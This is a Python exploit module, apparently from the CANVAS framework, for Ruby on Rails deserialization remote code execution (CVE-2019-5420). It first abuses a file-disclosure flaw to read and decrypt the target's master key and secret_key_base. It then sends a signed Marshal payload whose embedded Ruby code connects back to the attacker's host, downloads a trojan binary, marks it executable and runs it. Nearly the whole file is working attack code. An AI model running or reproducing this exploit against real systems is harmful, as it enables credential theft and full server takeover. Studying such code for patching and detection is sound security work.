#!/usr/bin/env python2
import os
import re
import sys
import hmac
import time
import hashlib
import threading
if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from exploitutils import *
from tcpexploit import tcpexploit
from exploitmanager import exploitmanager
from ExploitTypes.CommandLineExecuter import CommandExploit

from libs.spkproxy import urlopen
from libs.canvasos import canvasos

from Crypto.Cipher import AES
from Crypto.Util import Counter


NAME                            = 'Ruby on Rails Arbitrary Deserialization RCE (CVE-2019-5420)'
DESCRIPTION                     = 'ActiveStorage of Ruby on Rails allow deserialization using a malicious Object serializated in the URL /rails/active_storage/disk/'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Rails"
DOCUMENTATION["Repeatability"]  = 'Infinite'
DOCUMENTATION["CVE Name"]       = 'CVE-2019-5420'
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-5420"
DOCUMENTATION["References"]     = "https://groups.google.com/forum/#!topic/rubyonrails-security/IsQKvDqZdKw"
DOCUMENTATION["Date public"]    = "13/03/2019"
DOCUMENTATION["NOTES"]          = """

The vulnerability resides in the ActionStorage component of Ruby on Rails due to insufficient validation
on Marshal.load().

This exploit works with Ruby On Rails applications in production, which must be vulnerable to Arbitrary File Disclosure (CVE-2019-5418),
configuration files are read in order to obtain the secret_key used to sign the encoded object sent in the URL.

IMPORTANT: In the path textfield you need to put a controller vulnerable to CVE-2019-5418.

Vulnerable Rails versions:
 * < 5.2.2.1
 * < 5.1.6.2
 * < 5.0.7.2
 * < 4.2.11.1

Tested on:
 * Ubuntu 18.10, Rails 5.2.1
"""

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Web Exploits"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["UNIX"] ]
PROPERTY['VERSION']             = [ "5.2.1" ]


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.name = NAME
        self.path = os.path.dirname(__file__)
        self.payloadType = 0

        self.host = ""
        self.hostname = ''
        self.port = 80
        self.https = False
        self.hostname = None
        self.file_to_download = ''
        self.ua = None
        self.filedata = None

        self.basicauth_user = ""
        self.basicauth_password = ""

        self.tcp_port = 0

        self.active_storage_path = '/rails/active_storage/disk/'

    def neededListenerTypes(self):
       return [canvasengine.UNIVERSAL_MOSDEF]

    def getargs(self):
        self.host = self.target.interface
        self.hostname = self.argsDict.get('hostname', self.hostname)
        self.port = int(self.argsDict.get("port", self.port))
        self.getarg('https')
        self.getarg('path')
        self.getarg('basicauth_user')
        self.getarg('basicauth_password')
        self.basicauth = self.basicauth_user != ''

        if self.hostname == '' or self.hostname is None:
            self.hostname = self.host

    def send_request(self, url, auth, headers = []):
        logging.debug('URL: ' + url)
        (fd, code) = urlopen(url,
                         verb='GET',
                         exploit=self,
                         hostname=self.hostname,
                         auth=auth,
                         extraheaders=headers,
                         noresponse=False,
                         entireresponse=False,
                         return_response_code=True
                    )
        return (fd.read(), code)

    def build_url(self,  path=''):
        target = 'https' if self.https else 'http'
        target += '://' + self.hostname
        target += ':' + str(self.port) if self.port not in (80, 443) else ''
        target += path if path else '/'
        return target

    def send_payload(self, path):
        auth = None
        if self.basicauth:
            logging.debug('Using basic auth {}:{}'.format(self.basicauth_user,
                                                          self.basicauth_password))
            auth = spkproxy.BasicAuth(self.basicauth_user, self.basicauth_password)

        url = self.build_url(path=path)
        response, code = self.send_request(url, auth)
        return response, code

    def read_file(self, filename):
        rails_accept_readfile = self.engine.getModuleExploit("rails_accept_readfile")
        rails_accept_readfile.link(self)
        rails_accept_readfile.hostname = self.hostname
        rails_accept_readfile.port     = self.port
        rails_accept_readfile.https    = self.https
        rails_accept_readfile.host     = self.target.interface
        rails_accept_readfile.path     = self.path
        rails_accept_readfile.basicauth_user = self.basicauth_user
        rails_accept_readfile.basicauth_password = self.basicauth_password
        rails_accept_readfile.file_to_download = filename

        info_success = rails_accept_readfile.run()
        if not info_success:
            logging.error("Failed to read file: %s" % filename)
            return None

        logging.info('Reading %s file' % filename)
        return rails_accept_readfile.filedata

    def get_derivated_key(self):
        master_key = self.read_file('./config/master.key')
        credentials_enc = self.read_file('./config/credentials.yml.enc')

        if not master_key or not credentials_enc:
            return False

        secret_enc, iv, tag = credentials_enc.split('--')
        counter = Counter.new(nbits=32, prefix=iv.decode('base64'), initial_value=2, allow_wraparound=False)
        aes = AES.new(master_key.decode('hex'), AES.MODE_CTR, counter=counter)
        secret_dec = aes.decrypt(secret_enc.decode('base64'))
        logging.debug('Credentials.yml decrypted: %s' % secret_dec)
        secret_key = re.search('secret_key_base: ([0-9a-fA-F]*)', secret_dec).group(1)
        logging.info('secret_key_base: %s' % secret_key)
        return hashlib.pbkdf2_hmac('sha1', secret_key, 'ActiveStorage', 1000, dklen=64)

    def send_mosdef_trojan(self):
        ret = True
        try:
            server = gettcplistener(self.tcp_port)
            client, _ = server.accept()
            data = client.recv(256)
            arch = data.split('-')[0]

            if arch.lower() == 'x86_64':
                self.arch = 'X64'
            elif arch.lower() == 'i386':
                self.arch = 'X86'
            else:
                logging.info('OS not supported')
                raise ValueError(arch)

            t_os = canvasos("Linux")
            t_os.arch = self.arch
            self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=t_os, universal=True)
            client.sendall(self.mosdeftrojan)
            client.close()
            server.close()
        except Exception as e:
            logging.error('Failed to detect architecture: %s' % str(e))
            ret = False

        return ret

    def build_payload(self, derivated_key):
        payload_code = '''require 'socket'

path = ''
Dir.chdir("/")
Dir.glob("**/*").each do |entry|
    if File.directory?(entry) and File.world_writable?(entry) & 1
        blacklist = ["/mqueue", "/lock", "/proc", "/metrics"]
        entry = "/" + entry
        blacklisted = false
        blacklist.each do |bl|
            if entry.include?(bl)
                blacklisted = true
                break
            end
        end
        if not blacklisted
            path = entry
            break
        end
    end
end

s = TCPSocket.open 'CALLBACK_IP', CALLBACK_PORT
s.puts RUBY_PLATFORM
fd = File.open(path + "/FILENAME", "wb")
while true
    data = s.recv(4096)
    break if data.empty?
    fd.write(data)
end
fd.close()
if RUBY_PLATFORM.include? "linux"
    system("chmod +x " + path +  "/FILENAME")
    fork { exec(path +  "/FILENAME") }
end'''

        self.tcp_port = random.randint(40000, 65535)
        t = threading.Thread(target=self.send_mosdef_trojan)
        t.setDaemon(True)
        t.start()

        payload_code = payload_code.replace('FILENAME', randomstring(8))
        payload_code = payload_code.replace('CALLBACK_IP', self.callback.ip)
        payload_code = payload_code.replace('CALLBACK_PORT', str(self.tcp_port))

        ruby_payload = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\x08:\x0e@instanceo:\x08ERB\x08:\t@srcI"\x02'
        ruby_payload += struct.pack('<H', len(payload_code)) + payload_code
        ruby_payload += '\x06:\x06ET:\x0c@linenoi\x06:\x0e@filenameI"\x061\x06;\tT:\x0c@method:\x0bresult:\x10@deprecatoro:\x1fActiveSupport::Deprecation\x06:\x0e@silencedT'

        json_object = '{"_rails":{"message":"%s","exp":null,"pur":"blob_key"}}' % ruby_payload.encode('base64').replace('\n', '')
        json_encoded = json_object.encode('base64').replace('\n', '')
        sign = hmac.new(derivated_key, json_encoded, hashlib.sha1).hexdigest()
        return '%s--%s' % (json_encoded, sign)

    def run(self):
        result = False
        self.setProgress(0)
        self.getargs()
        self.setInfo("{} attacking {}:{} (in progress)".format(self.name, self.hostname, self.port))
        self.setProgress(33)

        derivated_key = self.get_derivated_key()
        if derivated_key:
            logging.info("Target appears to be vulnerable")
            logging.info("Derivated key: %s" % derivated_key.encode('hex'))
            logging.info('Generating payload')
            payload = self.build_payload(derivated_key)
            logging.info('Sending payload')
            path = self.active_storage_path + payload + "/" + randomstring(8)
            response, code = self.send_payload(path)
            logging.info('Waiting for callback')
            if code == 200:
                for i in range(30):
                    time.sleep(0.5)
                    if self.ISucceeded():
                        result = True
                        break
        else:
            logging.error("Target %s is not vulnerable to CVE-2019-5418" % self.hostname)
            logging.error("It's not possible to read the configuration files")

        if result:
            self.setProgress(100)
            self.setInfo("{} in {}:{} done (success)".format(self.name, self.hostname, self.port))
            return True
        else:
            self.setInfo("{} in {}:{} done (failed)".format(self.name, self.hostname, self.port))
            self.setProgress(-1)
            return False


if __name__ == '__main__':
    logging.info("Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION))
    app = theexploit()
    ret = standard_callback_commandline(app)

